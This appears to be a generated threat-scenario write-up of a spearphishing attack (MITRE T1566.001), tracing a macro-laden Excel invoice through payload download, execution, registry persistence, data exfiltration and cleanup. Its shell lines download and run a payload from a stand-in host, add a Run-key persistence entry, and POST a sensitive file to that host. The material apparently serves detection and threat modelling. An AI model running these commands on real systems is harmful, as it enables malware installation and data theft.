<output>
Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload leading to further exploitation. The attack involves multiple applications, including Outlook for email access, Excel for the malicious attachment, and PowerShell for executing commands.

Attack Flow Breakdown:

1. **Initial Access via Email**
   - **Application Involved**: Microsoft Outlook
   - **User Action**: The user receives an email with a subject line "Invoice Attached" and an attachment named "Invoice_2023.xlsx".
   - **Key Artifacts**: Email headers, attachment file "Invoice_2023.xlsx".
   - **Network Indicators**: The email is sent from a suspicious domain (e.g., attacker@example.com).

2. **Opening the Malicious Attachment**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user opens the attachment in Excel.
   - **Key Artifacts**: Excel file "Invoice_2023.xlsx" contains embedded macros.
   - **Command-Line Syntax**: 
     ```shell
     # Excel opens the file and executes the embedded macro
     start excel.exe "C:\Users\User\Downloads\Invoice_2023.xlsx"
     ```

3. **Macro Execution**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user enables macros when prompted by Excel.
   - **Key Artifacts**: Macro code executes a PowerShell command to download a payload.
   - **Command-Line Syntax**: 
     ```shell
     # Macro executes PowerShell to download the payload
     powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\Users\User\AppData\Local\Temp\payload.exe'"
     ```

4. **Payload Execution**
   - **Application Involved**: PowerShell
   - **User Action**: The macro runs the downloaded executable.
   - **Key Artifacts**: Executable file "payload.exe" is executed.
   - **Command-Line Syntax**: 
     ```shell
     # Execute the downloaded payload
     start C:\Users\User\AppData\Local\Temp\payload.exe
     ```

5. **Establishing Persistence**
   - **Application Involved**: Windows Registry
   - **User Action**: The payload modifies the registry to ensure persistence.
   - **Key Artifacts**: Registry keys are created under HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
   - **Command-Line Syntax**: 
     ```shell
     # Add a registry entry for persistence
     reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\Users\User\AppData\Local\Temp\payload.exe" /f
     ```

6. **Data Exfiltration**
   - **Application Involved**: PowerShell
   - **User Action**: The payload collects sensitive data and sends it to the attacker's server.
   - **Key Artifacts**: Data files are created and sent over HTTP/HTTPS.
   - **Command-Line Syntax**: 
     ```shell
     # Exfiltrate data to the attacker's server
     powershell.exe -Command "Invoke-WebRequest -Uri 'http://malicious.com/exfiltrate' -Method POST -Body (Get-Content 'C:\Users\User\Documents\SensitiveData.txt')"
     ```

7. **Cleanup and Evasion**
   - **Application Involved**: PowerShell
   - **User Action**: The payload deletes its traces to avoid detection.
   - **Key Artifacts**: Temporary files and logs are deleted.
   - **Command-Line Syntax**: 
     ```shell
     # Clean up temporary files
     Remove-Item 'C:\Users\User\AppData\Local\Temp\payload.exe' -Force
     ```

</output>